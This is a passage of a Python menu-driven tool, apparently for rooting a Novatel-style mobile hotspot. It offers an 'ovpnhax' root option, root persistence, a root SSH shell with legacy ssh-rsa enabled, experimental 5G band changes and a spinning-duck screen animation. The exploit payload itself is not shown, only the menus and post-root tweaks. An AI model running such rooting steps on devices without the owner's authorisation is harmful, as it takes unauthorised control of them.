           "-o", "HostKeyAlgorithms=+ssh-rsa",
           "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa"]
    if key:
        # no PasswordAuthentication=no: if key auth ever fails, ssh quietly
        # falls back to the password prompt instead of dying
        cmd += ["-i", str(key), "-o", "IdentitiesOnly=yes"]
    cmd.append(f"root@{HOST}")

    def _screen(name):
        # screen pushes are best-effort: a failed connect shouldn't block
        # the shell itself
        try:
            cli = ssh_connect()
            show_device_screen(cli, name)
            cli.close()
        except Exception:
            pass

    _screen("operation-inprogress")
    subprocess.call(cmd)
    _screen("operation-done")


# ------------------------------------------------------------- tweaks -------

MODEM2 = "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/modem2_cli"


def modem2_set_nr5g_bands(cli, kind, bands):
    """set_enabled_nr5g_*_bands ignores argv and prompts on stdin: first the
    band count, then one band number per line. It never exits by itself, so we
    feed everything and drop the channel. Each call REPLACES the whole list."""
    chan = cli.get_transport().open_session()
    chan.exec_command(f"{MODEM2} set_enabled_nr5g_{kind}_bands 2>&1")
    time.sleep(1)
    chan.sendall(f"{len(bands)}\n".encode())
    time.sleep(0.5)
    for b in bands:
        chan.sendall(f"{b}\n".encode())
        time.sleep(1.5)
    time.sleep(2)
    out = b""
    while chan.recv_ready():
        out += chan.recv(4096)
        time.sleep(0.1)
    chan.close()
    return out.decode(errors="replace").strip()

DUCK_SH = """#!/bin/sh
# SpinningDuck on the screen, frames in /data/duck
export LD_LIBRARY_PATH="${LD_LIBRARY_PATH}:/opt/nvtl/lib"
DIR=/data/duck
COUNT=36
DELAY=83333

CHILD=""
stop() {
    [ -n "$CHILD" ] && kill "$CHILD" 2>/dev/null
    exit 0
}
trap stop INT TERM

while :; do
    /opt/nvtl/bin/mifi_display_png "$DIR/duck_" "$COUNT" "$DELAY" &
    CHILD=$!
    wait "$CHILD"
done
"""


def duck_installed(cli):
    _, out, _ = ssh_exec(cli, "[ -f /opt/nvtl/bin/duck ] && [ -d /data/duck ] && echo yes")
    return out == "yes"


def duck_running(cli):
    _, out, _ = ssh_exec(cli, "pidof mifi_display_png 2>/dev/null")
    return bool(out)


def duck_start(cli):
    ssh_exec(cli, "nohup /opt/nvtl/bin/duck >/dev/null 2>&1 &")
    ok("duck is spinning on the screen")


def duck_stop(cli):
    ssh_exec(cli, "kill $(ps w | awk '/duck|mifi_display_png/ && !/awk/ {print $1}') 2>/dev/null")
    ok("duck stopped")
    info("tap anywhere on the screen to bring back the device UI")


def duck_install(cli):
    frames = sorted(Path("tools/frames").glob("duck_*.png"),
                    key=lambda p: int(p.stem.split("_")[1]))
    if not frames:
        fail("no frames in tools/frames (run tools/duck.py once, it needs ffmpeg)")
        pause()
        return
    clear()
    banner()
    print(f"  {BOLD}{MAGENTA}Duck install{RESET}\n")
    show_device_screen(cli, "operation-inprogress")
    ssh_exec(cli, "mkdir -p /data/duck")
    pushed = 0
    for f in frames:
        remote = f"/data/duck/{f.name}"
        _, out, _ = ssh_exec(cli, f"[ -f {remote} ] && echo yes || echo no")
        if out != "yes":
            if push_bytes(cli, remote, f.read_bytes()) != 0:
                fail(f"upload failed: {f.name}")
                pause()
                return
            pushed += 1
    if push_bytes(cli, "/opt/nvtl/bin/duck", DUCK_SH.encode()) != 0:
        fail("failed to write /opt/nvtl/bin/duck")
        pause()
        return
    ssh_exec(cli, "chmod +x /opt/nvtl/bin/duck")
    rc, out, _ = ssh_exec(cli, "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/mifi_display_png /data/duck/duck_1 2>&1")
    if rc != 0:
        fail(f"frame test failed: {out}")
        pause()
        return
    ok(f"duck installed ({pushed} frames pushed, frames and script survive reboots)")
    show_device_screen(cli, "operation-done")
    pause()


def flow_duck(cli, installed):
    if not installed:
        duck_install(cli)
        if not duck_installed(cli):
            return
    while True:
        running = duck_running(cli)
        state = (f"{GREEN}duck is spinning on the screen{RESET}" if running
                 else f"{DIM}duck is installed but not running{RESET}")
        opts = (["Stop duck"] if running else ["Start duck"]) + ["Uninstall duck", "Back"]
        sel = menu("Duck", opts, info_lines=[state])
        if sel == -1 or opts[sel] == "Back":
            return
        clear()
        banner()
        print()
        if opts[sel] == "Start duck":
            duck_start(cli)
            pause()
        elif opts[sel] == "Stop duck":
            duck_stop(cli)
            pause()
        elif opts[sel] == "Uninstall duck":
            duck_stop(cli)
            ssh_exec(cli, "rm -f /opt/nvtl/bin/duck; rm -rf /data/duck")
            ok("duck uninstalled")
            pause()
            return


def tweak_submenu(cli):
    while True:
        # the connection may have died while we sat at the menu
        cli = ssh_ensure(cli)
        if not cli:
            return
        installed = duck_installed(cli)
        opts = [
            "Device / modem info (ATI)",
            "5G status",
            "5G band and PCI",
            "Enabled NR5G bands (NSA)",
            "Enabled NR5G bands (SA)",
            "Set enabled NR5G bands (EXPERIMENTAL)",
            "5G radio enable/disable (EXPERIMENTAL)",
            "Duck (installed)" if installed else "Install duck",
            "Show about screen",
            "Reboot device",
            "Back",
        ]
        sel = menu("Tweaks", opts, info_lines=[
            f"{DIM}modem2_cli has ~300 commands, see modem2_cli_help.txt{RESET}",
        ])
        if sel in (-1, 10):
            return
        clear()
        banner()
        print()
        if sel == 0:
            _, out, _ = ssh_exec(cli, "LD_LIBRARY_PATH=/opt/nvtl/lib /opt/nvtl/bin/read_atcmd ATI")
            print(out)
        elif sel == 1:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_5g_status")
            print(out)
        elif sel == 2:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_5g_band_pci")
            print(out)
        elif sel == 3:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_enabled_nr5g_nsa_bands")
            print(out)
        elif sel == 4:
            _, out, _ = ssh_exec(cli, f"{MODEM2} get_enabled_nr5g_sa_bands")
            print(out)
        elif sel == 5:
            warn("experimental: modem2_cli prompts for a band count, then each")
            warn("band number. set your current bands back if the modem drops")
            warn("service. press enter alone to cancel.")
            bands = prompt("bands, space separated (e.g. '5 7 8 78') [cancel]:")
            if not bands:
                print("cancelled")
            elif not all(t.isdigit() for t in bands.split()):
                fail("invalid input: numbers only, space separated.")
                fail("(to cancel, just press enter at the prompt)")
            else:
                blist = bands.split()
                show_device_screen(cli, "operation-inprogress")
                for kind in ("nsa", "sa"):
                    out = modem2_set_nr5g_bands(cli, kind, blist)
                    print(f"{kind}: {out or '(no output)'}")
                _, out, _ = ssh_exec(cli, f"{MODEM2} get_enabled_nr5g_nsa_bands")
                print(out)
                show_device_screen(cli, "operation-done")
                warn("if the modem dropped service, set your old bands back or reboot")
        elif sel == 6:
            warn("experimental: argument format undocumented (0=off, 1=on expected)")
            val = prompt("enable? 1/0 [cancel]:")
            if val in ("0", "1"):
                _, out, _ = ssh_exec(cli, f"{MODEM2} 5g_radio_set_enabled {val}")
                print(out)
        elif sel == 7:
            flow_duck(cli, installed)
        elif sel == 8:
            show_device_screen(cli, "about")
        elif sel == 9:
            if menu("Reboot device?", ["Cancel", "Reboot"]) == 1:
                ssh_exec(cli, "reboot")
                ok("rebooting, ssh will drop")
                pause()
                return
        if sel not in (-1, 9, 10):
            pause()


# ----------------------------------------------------------------- main -----

def main():
    clear()
    banner()
    info("connecting...")
    good, msg = check_server()
    if not good:
        clear()
        banner()
        print(f"""
  {RED}{BOLD}*******************************************************************
  *  {msg}
  *  Connect to the hotspot's Wi-Fi network and try again.
  *******************************************************************{RESET}
""")
        sys.exit(1)

    session = requests.Session()
    model = device_model(session)
    local_ip = get_local_ip()
    up, authed = probe_root()

    perm = None  # None = not probed yet, True/False = persistence state
    while True:
        if authed and perm is None:
            try:
                cli = ssh_connect()
                perm = persistence_installed(cli)
                cli.close()
            except Exception:
                perm = None
        status = (f"{GREEN}root active (persistent){RESET}" if authed and perm else
                  f"{GREEN}root active (TEMPORARY!){RESET}" if authed else
                  f"{YELLOW}ssh up, auth unknown{RESET}" if up else
                  f"{DIM}no root (stock){RESET}")
        state = {"authed": authed}
        sel = menu(f"{model}: main menu",
                   ["Rooting", "Backup", "Files", "Tweaks", "SSH shell", "Exit"],
                   info_lines=[
                       f"device:    {BOLD}{model}{RESET}   status: {status}",
                       f"device:    {HOST}   your LAN IP: {local_ip}",
                       f"payload:   {PAYLOAD_LOCAL} (served on :{PAYLOAD_PORT})",
                   ])
        try:
            if sel in (-1, 5):
                clear()
                return
            if sel == 0:
                root_menu(state)
                up, authed = probe_root()
                perm = None  # rooting may have changed persistence, re-probe
            elif sel == 1:
                flow_backup()
            elif sel == 2:
                flow_files()
            elif sel == 3:
                if not authed:
                    clear()
                    banner()
                    fail("root required for tweaks")
                    pause()
                else:
                    cli = ssh_connect()
                    tweak_submenu(cli)
                    cli.close()
            elif sel == 4:
                if not authed:
                    clear()
                    banner()
                    fail("root required for ssh (run Rooting first)")
                    pause()
                else:
                    flow_ssh_shell()
        except KeyboardInterrupt:
            continue


def root_menu(state):
    while True:
        sel = menu("Rooting", [
            "Root the device (ovpnhax)",
            "Install root persistence",
            "Uninstall root",
            "Test root access",
            "Back",
        ])
        if sel in (-1, 4):
            return
        clear()
        banner()
        print()
        if sel == 0:
            flow_root(state)
        elif sel == 1:
            try:
                cli = ssh_connect()
            except Exception as e:
                fail(f"ssh failed: {e}")
                pause()
                continue
            if ssh_ensure(cli):
                if flow_persistence(cli):
                    show_device_screen(cli, "rootpersistence-success")
            cli.close()
            pause()
        elif sel == 2:
            try:
                cli = ssh_connect()
            except Exception as e:
                fail(f"ssh failed: {e}")
                pause()
                continue
            if ssh_ensure(cli):
                flow_unroot(cli)
            cli.close()
            pause()
        elif sel == 3:
            up, authed = probe_root()
            if authed:
                ok(f"root SSH is up on :{SSH_PORT} and {ROOT_PW} works")
                try:
                    cli = ssh_connect()
                    if persistence_installed(cli):
                        ok("persistence is installed - root is permanent")
                        show_device_screen(cli, "you-are-rooted")
                    else:
                        warn("no persistence found - this root dies on reboot")
                        show_device_screen(cli, "you-are-temp-rooted")
                    cli.close()
                except Exception as e:
                    fail(f"ssh failed: {e}")
            elif up:
                warn(f"ssh is up but {ROOT_PW} was rejected (rooted with another tool or password changed?)")
            else:
                fail("ssh is not up, device looks stock")
            pause()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        clear()
        print("\nbye\n")
